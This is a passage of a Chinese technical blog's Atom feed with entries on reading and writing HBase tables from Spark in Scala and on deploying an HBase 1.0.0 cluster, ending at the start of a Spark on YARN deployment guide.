class=&quot;number&quot;&gt;38&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; localData&lt;/span&gt; = sc.parallelize(rawData).map(convert)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 4：&lt;/strong&gt; 使用&lt;code&gt;saveAsHadoopDataset&lt;/code&gt;方法写入HBase&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;Data.saveAsHadoopDataset(jobConf)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;读取-HBase&quot;&gt;&lt;a href=&quot;#读取-HBase&quot; class=&quot;headerlink&quot; title=&quot;读取 HBase&quot;&gt;&lt;/a&gt;读取 HBase&lt;/h3&gt;&lt;p&gt;Spark读取HBase，我们主要使用&lt;code&gt;SparkContext&lt;/code&gt; 提供的&lt;code&gt;newAPIHadoopRDD&lt;/code&gt;API将表的内容以 RDDs 的形式加载到 Spark 中。 &lt;/p&gt;
&lt;figure class=&quot;highlight scala&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; conf = &lt;span class=&quot;type&quot;&gt;HBaseConfiguration&lt;/span&gt;.create()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;conf.set(&lt;span class=&quot;string&quot;&gt;&quot;hbase.zookeeper.property.clientPort&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;2181&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;conf.set(&lt;span class=&quot;string&quot;&gt;&quot;hbase.zookeeper.quorum&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;master&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//设置查询的表名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;conf.set(&lt;span class=&quot;type&quot;&gt;TableInputFormat&lt;/span&gt;.&lt;span class=&quot;type&quot;&gt;INPUT_TABLE&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;user&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; usersRDD = sc.newAPIHadoopRDD(conf, classOf[&lt;span class=&quot;type&quot;&gt;TableInputFormat&lt;/span&gt;],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  classOf[org.apache.hadoop.hbase.io.&lt;span class=&quot;type&quot;&gt;ImmutableBytesWritable&lt;/span&gt;],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  classOf[org.apache.hadoop.hbase.client.&lt;span class=&quot;type&quot;&gt;Result&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; count = usersRDD.count()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;println(&lt;span class=&quot;string&quot;&gt;&quot;Users RDD Count:&quot;&lt;/span&gt; + count)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;usersRDD.cache()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//遍历输出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;usersRDD.foreach&amp;#123; &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; (_,result) =&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; key = &lt;span class=&quot;type&quot;&gt;Bytes&lt;/span&gt;.toInt(result.getRow)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; name = &lt;span class=&quot;type&quot;&gt;Bytes&lt;/span&gt;.toString(result.getValue(&lt;span class=&quot;string&quot;&gt;&quot;basic&quot;&lt;/span&gt;.getBytes,&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;.getBytes))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; age = &lt;span class=&quot;type&quot;&gt;Bytes&lt;/span&gt;.toInt(result.getValue(&lt;span class=&quot;string&quot;&gt;&quot;basic&quot;&lt;/span&gt;.getBytes,&lt;span class=&quot;string&quot;&gt;&quot;age&quot;&lt;/span&gt;.getBytes))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  println(&lt;span class=&quot;string&quot;&gt;&quot;Row key:&quot;&lt;/span&gt;+key+&lt;span class=&quot;string&quot;&gt;&quot; Name:&quot;&lt;/span&gt;+name+&lt;span class=&quot;string&quot;&gt;&quot; Age:&quot;&lt;/span&gt;+age)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;附录&quot;&gt;&lt;a href=&quot;#附录&quot; class=&quot;headerlink&quot; title=&quot;附录&quot;&gt;&lt;/a&gt;附录&lt;/h2&gt;&lt;p&gt;更完整的代码已上传到 Gist 。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://gist.github.com/wuchong/95630f80966d07d7453b#file-hbasenewapi-scala&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;HBaseNewAPI.scala&lt;/a&gt;  HBase 的 CRUD 操作&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://gist.github.com/wuchong/95630f80966d07d7453b#file-sparkonhbase-scala&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;SparkOnHBase.scala&lt;/a&gt;  Spark 操作 HBase&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      本文将分两部分介绍，第一部分讲解使用 HBase 新版 API 进行 CRUD 基本操作；第二部分讲解如何将 Spark 内的 RDDs 写入 HBase 的表中，反之，HBase 中的表又是如何以 RDDs 形式加载进 Spark 内的。
    
    </summary>
    
      <category term="分布式系统" scheme="http://wuchong.me/categories/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="Spark" scheme="http://wuchong.me/tags/Spark/"/>
    
      <category term="HBase" scheme="http://wuchong.me/tags/HBase/"/>
    
  </entry>
  
  <entry>
    <title>HBase 集群安装部署</title>
    <link href="http://wuchong.me/blog/2015/04/05/hbase-cluster-deploy/"/>
    <id>http://wuchong.me/blog/2015/04/05/hbase-cluster-deploy/</id>
    <published>2015-04-05T15:40:09.000Z</published>
    <updated>2016-03-08T12:10:53.000Z</updated>
    
    <content type="html">&lt;p&gt;软件环境&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;OS: Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic x86_64)&lt;br&gt;Java: jdk1.7.0_75&lt;br&gt;Hadoop: hadoop-2.6.0&lt;br&gt;Hbase: hbase-1.0.0&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;集群机器：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;IP&lt;/th&gt;
&lt;th&gt;HostName&lt;/th&gt;
&lt;th&gt;Mater&lt;/th&gt;
&lt;th&gt;RegionServer&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;10.4.20.30&lt;/td&gt;
&lt;td&gt;master&lt;/td&gt;
&lt;td&gt;yes&lt;/td&gt;
&lt;td&gt;no&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;10.4.20.31&lt;/td&gt;
&lt;td&gt;slave1&lt;/td&gt;
&lt;td&gt;no&lt;/td&gt;
&lt;td&gt;yes&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;10.4.20.32&lt;/td&gt;
&lt;td&gt;slave2&lt;/td&gt;
&lt;td&gt;no&lt;/td&gt;
&lt;td&gt;yes&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&quot;准备&quot;&gt;&lt;a href=&quot;#准备&quot; class=&quot;headerlink&quot; title=&quot;准备&quot;&gt;&lt;/a&gt;准备&lt;/h2&gt;&lt;p&gt;假设你已经安装部署好了 Hadoop 集群和 Java，可以参考 &lt;a href=&quot;/blog/2015/04/04/spark-on-yarn-cluster-deploy/&quot;&gt;Spark on YARN 集群部署手册&lt;/a&gt; 这篇文章。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;下载解压&quot;&gt;&lt;a href=&quot;#下载解压&quot; class=&quot;headerlink&quot; title=&quot;下载解压&quot;&gt;&lt;/a&gt;下载解压&lt;/h2&gt;&lt;p&gt;可以从&lt;a href=&quot;http://www.apache.org/dyn/closer.cgi/hbase/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;官方下载地址&lt;/a&gt;下载 HBase 最新版本，推荐 stable 目录下的二进制版本。我下载的是 hbase-1.0.0-bin.tar.gz 。确保你下载的版本与你现存的 Hadoop 版本兼容（&lt;a href=&quot;http://hbase.apache.org/book.html#hadoop&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;兼容列表&lt;/a&gt;）以及支持的JDK版本（HBase 1.0.x 已经不支持 JDK 6 了）。&lt;/p&gt;
&lt;p&gt;解压缩&lt;br&gt;&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;-zxvf&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;hbase-1&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.0-bin&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.tar&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.gz&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;hbase-1&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;配置-HBase&quot;&gt;&lt;a href=&quot;#配置-HBase&quot; class=&quot;headerlink&quot; title=&quot;配置 HBase&quot;&gt;&lt;/a&gt;配置 HBase&lt;/h2&gt;&lt;p&gt;编辑&lt;code&gt;hbase-env.sh&lt;/code&gt;文件，修改 JAVA_HOME 为你的路径。&lt;br&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# The java implementation to &lt;span class=&quot;keyword&quot;&gt;use&lt;/span&gt;.  &lt;span class=&quot;keyword&quot;&gt;Java&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1.7&lt;/span&gt;+ &lt;span class=&quot;keyword&quot;&gt;required&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;export&lt;/span&gt; JAVA_HOME=/home/spark/workspace/jdk1&lt;span class=&quot;number&quot;&gt;.7&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.0&lt;/span&gt;_75&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;编辑&lt;code&gt;conf/hbase-site.xml&lt;/code&gt;文件：&lt;br&gt;&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;configuration&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;hbase.rootdir&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;hdfs://master:9000/hbase&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;hbase.cluster.distributed&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;true&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;hbase.zookeeper.quorum&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;master,slave1,slave2&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;hbase.zookeeper.property.dataDir&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;/home/spark/workspace/zookeeper/data&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;configuration&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;其中第一个属性指定本机的hbase的存储目录，必须与Hadoop集群的&lt;code&gt;core-site.xml&lt;/code&gt;文件配置保持一致；第二个属性指定hbase的运行模式，true代表全分布模式；第三个属性指定 Zookeeper 管理的机器，一般为奇数个；第四个属性是数据存放的路径。这里我使用的默认的 HBase 自带的 Zookeeper。&lt;/p&gt;
&lt;p&gt;配置regionservers，在regionservers文件中添加如下内容：&lt;br&gt;&lt;figure class=&quot;highlight nginx&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;slave1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;slave2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;regionservers&lt;/code&gt;文件列出了所有运行hbase的机器（即HRegionServer)。此文件的配置和Hadoop中的slaves文件十分相似，每行指定一台机器的主机名。当HBase启动的时候，会将此文件中列出的所有机器启动。关闭时亦如此。我们的配置意为在 slave1, slave2, slave3 上都将启动 RegionServer。&lt;/p&gt;
&lt;p&gt;将配置好的 hbase 文件分发给各个 slave&lt;br&gt;&lt;figure class=&quot;highlight elixir&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;scp -r hbase-&lt;span class=&quot;number&quot;&gt;1.0&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; spark&lt;span class=&quot;variable&quot;&gt;@slave1&lt;/span&gt;&lt;span class=&quot;symbol&quot;&gt;:~/workspace/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;scp -r hbase-&lt;span class=&quot;number&quot;&gt;1.0&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; spark&lt;span class=&quot;variable&quot;&gt;@slave2&lt;/span&gt;&lt;span class=&quot;symbol&quot;&gt;:~/workspace/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;修改-ulimit-限制&quot;&gt;&lt;a href=&quot;#修改-ulimit-限制&quot; class=&quot;headerlink&quot; title=&quot;修改 ulimit 限制&quot;&gt;&lt;/a&gt;修改 ulimit 限制&lt;/h2&gt;&lt;p&gt;HBase 会在同一时间打开大量的文件句柄和进程，超过 Linux 的默认限制，导致可能会出现如下错误。&lt;br&gt;&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;2010&lt;span class=&quot;selector-tag&quot;&gt;-04-06&lt;/span&gt; 03&lt;span class=&quot;selector-pseudo&quot;&gt;:04&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:37&lt;/span&gt;,542 &lt;span class=&quot;selector-tag&quot;&gt;INFO&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.apache&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.hadoop&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.hdfs&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.DFSClient&lt;/span&gt;: &lt;span class=&quot;selector-tag&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;increateBlockOutputStream&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.io&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.EOFException&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2010&lt;span class=&quot;selector-tag&quot;&gt;-04-06&lt;/span&gt; 03&lt;span class=&quot;selector-pseudo&quot;&gt;:04&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:37&lt;/span&gt;,542 &lt;span class=&quot;selector-tag&quot;&gt;INFO&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.apache&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.hadoop&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.hdfs&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.DFSClient&lt;/span&gt;: &lt;span class=&quot;selector-tag&quot;&gt;Abandoning&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;block&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;blk_-6935524980745310745_1391901&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;所以编辑&lt;code&gt;/etc/security/limits.conf&lt;/code&gt;文件，添加以下两行，提高能打开的句柄数量和进程数量。注意将&lt;code&gt;spark&lt;/code&gt;改成你运行 HBase 的用户名。&lt;/p&gt;
&lt;figure class=&quot;highlight nginx&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;spark&lt;/span&gt;  -       nofile  &lt;span class=&quot;number&quot;&gt;32768&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;spark  -       nproc   &lt;span class=&quot;number&quot;&gt;32000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;还需要在 &lt;code&gt;/etc/pam.d/common-session&lt;/code&gt; 加上这一行:&lt;br&gt;&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;session&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;required&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;pam_limits&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.so&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;否则在&lt;code&gt;/etc/security/limits.conf&lt;/code&gt;上的配置不会生效。&lt;/p&gt;
&lt;p&gt;最后还要注销（&lt;code&gt;logout&lt;/code&gt;或者&lt;code&gt;exit&lt;/code&gt;）后再登录，这些配置才能生效！使用&lt;code&gt;ulimit -n -u&lt;/code&gt;命令查看最大文件和进程数量是否改变了。记得在每台安装 HBase 的机器上运行哦。&lt;/p&gt;
&lt;h2 id=&quot;运行-HBase&quot;&gt;&lt;a href=&quot;#运行-HBase&quot; class=&quot;headerlink&quot; title=&quot;运行 HBase&quot;&gt;&lt;/a&gt;运行 HBase&lt;/h2&gt;&lt;p&gt;在master上运行&lt;br&gt;&lt;figure class=&quot;highlight dos&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; ~/workspace/hbase-&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bin/&lt;span class=&quot;built_in&quot;&gt;start&lt;/span&gt;-hbase.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;验证-HBase-成功安装&quot;&gt;&lt;a href=&quot;#验证-HBase-成功安装&quot; class=&quot;headerlink&quot; title=&quot;验证 HBase 成功安装&quot;&gt;&lt;/a&gt;验证 HBase 成功安装&lt;/h2&gt;&lt;p&gt;在 master 运行 &lt;code&gt;jps&lt;/code&gt; 应该会有&lt;code&gt;HMaster&lt;/code&gt;进程。在各个 slave 上运行&lt;code&gt;jps&lt;/code&gt; 应该会有&lt;code&gt;HQuorumPeer&lt;/code&gt;,&lt;code&gt;HRegionServer&lt;/code&gt;两个进程。&lt;/p&gt;
&lt;p&gt;在浏览器中输入 &lt;a href=&quot;http://master:16010&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://master:16010&lt;/a&gt; 可以看到 HBase Web UI 。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      HBase 1.0.0 集群安装部署手册指南
    
    </summary>
    
      <category term="分布式系统" scheme="http://wuchong.me/categories/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="Spark" scheme="http://wuchong.me/tags/Spark/"/>
    
      <category term="HBase" scheme="http://wuchong.me/tags/HBase/"/>
    
  </entry>
  
  <entry>
    <title>Spark On YARN 集群安装部署</title>
    <link href="http://wuchong.me/blog/2015/04/04/spark-on-yarn-cluster-deploy/"/>
    <id>http://wuchong.me/blog/2015/04/04/spark-on-yarn-cluster-deploy/</id>
    <published>2015-04-04T15:45:34.000Z</published>
    <updated>2016-05-12T11:16:17.000Z</updated>
    
    <content type="html">&lt;p&gt;最近毕设需要用到 Spark 集群，所以就记录下了部署的过程。我们知道 Spark 官方提供了三种集群部署方案： Standalone, Mesos, YARN。其中 Standalone 最为方便，本文主要讲述结合 YARN 的部署方案。&lt;/p&gt;
&lt;p&gt;软件环境：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic x86_64)&lt;br&gt;Hadoop: 2.6.0&lt;br&gt;Spark: 1.3.0&lt;/p&gt;
